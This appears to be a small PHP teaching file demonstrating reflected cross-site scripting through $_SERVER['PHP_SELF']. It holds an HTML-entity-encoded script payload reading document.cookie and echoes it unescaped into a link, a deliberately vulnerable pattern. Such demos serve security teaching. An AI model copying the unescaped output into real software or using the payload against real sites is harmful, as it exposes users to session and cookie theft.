<?php

  /*
    Hacker takes advantage of using $_SERVER['PHP_SELF'] by appending some ASCII coded JavaScript to the end of the url.
    When the $_SERVER['PHP_SELF'] outputs the URL in the request, it places the JavaScript into the page. The JavaScript will execute as it has not been sanitized to prevent it.
  */
  
  // $bad = http://website.com/"><script>alert(document.cookie)</script>
  $bad = "{$_SERVER['PHP_SELF']}&#47;&#34;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";

?>

<a href="<?= $bad ?>">malicious link</a>